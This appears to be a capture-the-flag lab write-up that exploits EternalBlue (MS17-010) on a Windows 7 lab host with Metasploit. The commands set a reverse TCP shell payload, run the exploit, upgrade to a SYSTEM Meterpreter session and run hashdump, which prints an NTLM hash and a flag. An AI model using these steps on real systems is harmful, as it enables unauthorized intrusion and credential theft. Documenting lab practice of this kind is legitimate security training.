# Introduction: Exploring Metasploit (msfconsole)

In this section, I document my initial exploration of Metasploit using the `msfconsole` interface. This includes searching for modules, understanding the framework structure, and preparing for exploitation.

## Step 1: Launching msfconsole

The first step was to launch Metasploit using the command:

- msfconsole

This starts Metasploit and displays information about the version, modules available, and helpful tips.

## Step 2: Searching for Modules

I ran the command search eternalblue, searching for modules related to the well-known EternalBlue vulnerability, which is an SMB (Server Message Block) exploit targeting Windows systems (CVE-2017-0144).

- search eternalblue

![Capture d'écran 2024-10-17 171308](https://github.com/user-attachments/assets/050a295d-87c3-4b47-a22a-802eb9ed4f29)


### 2. Exploitation: Exploiting MS17-010 (EternalBlue)

# Exploitation: Exploiting MS17-010 (EternalBlue)

This section details how to exploit the MS17-010 vulnerability, also known as EternalBlue, on a Windows system using Metasploit.

## Step 1: Selecting the Module

After searching for EternalBlue modules, I selected:

- use exploit/windows/smb/ms17_010_eternalblue

![Capture d'écran 2024-10-17 171322](https://github.com/user-attachments/assets/b8c19cff-5458-436f-a6f3-076807008c86)


## Step 2: Configuring the Payload

After selecting the exploit, Metasploit indicates that no payload was configured explicitly, so it defaults to windows/x64/meterpreter/reverse_tcp. This is a common payload that sets up a reverse TCP shell using the Meterpreter tool, providing an interactive shell upon successful exploitation.

- set payload windows/x64/shell_reverse_tcp

I listed compatible payloads to confirm the options.

The command is used to display all compatible payloads for the selected exploit. This is useful for selecting a different payload that fits my requirements or environment.

- show payloads

I set the payload to "generic/shell_reverse_tcp" by using the command "set payload 2". This payload will establish a reverse TCP shell connection when the exploit is successful, allowing me to gain remote access to the target system.

![Capture d'écran 2024-10-17 171340](https://github.com/user-attachments/assets/beefba76-8a95-43c6-b03b-d7a55646e994)

## Step 3: Showing Options for the Exploit

The command lists all the configurable parameters required for the EternalBlue exploit: 

RHOSTS: This is a required setting where I must specify the target host’s IP address.

RPORT: The target port, which defaults to 445 (the SMB port). This is also required.

SMBDomain: An optional field for specifying the Windows domain for authentication, relevant if the target is part of a domain.

SMBPass and SMBUser: Optional parameters to specify credentials if authentication is needed for the SMB connection.

VERIFY_ARCH: This option is set to true by default and is used to verify if the target's architecture matches the exploit's requirements (affects Windows Server 2008 R2, Windows 7, and Windows Embedded Standard 7).

VERIFY_TARGET: Also set to true by default, this checks if the remote OS matches the target's requirements to ensure the exploit can run properly.

- show options

![Capture d'écran 2024-10-17 171340](https://github.com/user-attachments/assets/d549f482-ee28-4f9f-969c-f68970f3160e)

## Step 4: Configuring Module Options

Next, I set the necessary options, specifically targeting the IP address of the vulnerable machine:

- set RHOSTS 10.10.103.236 (Target IP)

  ![image](https://github.com/user-attachments/assets/7415fce0-c0e9-4bc5-b745-77df6a9ba51f)

## Step 5: Executing the Exploit

- exploit

This resulted in a successful exploit and a shell session was opened on the target: 

Metasploit provides a detailed log of the exploitation process:

Host Check: The tool uses the auxiliary/scanner/smb/smb_ms17_010 module to verify if the target is vulnerable. It confirms that the host (10.10.103.236) is indeed vulnerable, running Windows 7 Professional 7601 Service Pack 1 (64-bit).

Connecting to the Target: Metasploit establishes a connection to the target host on SMB port 445.

Sending Exploit Packets: The exploit sends fragments of malicious packets designed to overwrite the target’s SMB memory buffers:

CORE Raw Buffer Dump: Displays raw buffer data obtained from the target.

Pool Grooming: The exploit uses a technique called "non-paged pool grooming" to prepare the target's memory for the attack.

Sending SMBv2 Buffers: Metasploit sends SMB buffers and manipulates the memory to achieve code execution.

EternalBlue Overwrite: The message EternalBlue overwrite completed successfully indicates that the exploit successfully modified the target’s memory (showing the status code 0xC000000D).

![Capture d'écran 2024-10-17 171405](https://github.com/user-attachments/assets/9db39d0d-e051-4d9b-a9ca-b1202b7e1da5)


### 3. Post-Exploitation: Upgrading Shell and Dumping Password Hashes

# Post-Exploitation: Upgrading Shell and Dumping Password Hashes

In this section, I document how to upgrade a basic shell session to Meterpreter and dump password hashes from the compromised system.

## Step 1: Upgrading the Shell to Meterpreter

After gaining a basic shell, I upgraded it to Meterpreter for better control:

- background

![image](https://github.com/user-attachments/assets/43558f03-1f7d-4776-8121-4f9cdb6476d7)

I entered background to suspend the current shell session (session 1). This allows me to keep the session active but return to the main Metasploit console.

- sessions -u 1

Using the command sessions -u 1, I upgraded the basic shell session (session 1) to a Meterpreter session. This leverages the post/multi/manage/shell_to_meterpreter module, which provides more capabilities and flexibility for post-exploitation activities.

The console shows the process of starting a new handler and sending the necessary payload to the target (10.10.103.236), successfully opening a new Meterpreter session (session 2).

The sessions command displays all active sessions:

Session 1: A basic shell (shell x64/windows), showing a connection with a Windows banner.

Session 2: An upgraded Meterpreter session (meterpreter x64/windows), running as NT AUTHORITY\SYSTEM on the host (JON-PC). This indicates that I have obtained SYSTEM-level access, the highest privilege level in Windows.

I enter sessions -i 2 to start interacting with the newly opened Meterpreter session (session 2).

## Step 2: Searching and Retrieving the Flag 

Once in the Meterpreter session, I searched for the flag.txt file:

- search -f flag.txt
cat "C:\\Users\\Jon\\Documents\\flag.txt"

The flag content was retrieved successfully: THM-5455554845.

## Step 3: Dumping Password Hashes

To gather further information, I used the hashdump module to extract password hashes:

- use post/windows/gather/hashdump
- set SESSION 2
- run

The command dumped the hashes for several accounts, including the "pirate" user:

pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::

![Capture d'écran 2024-10-17 172416](https://github.com/user-attachments/assets/b26f5d0d-37e3-4531-8c2d-d05a031d196b)






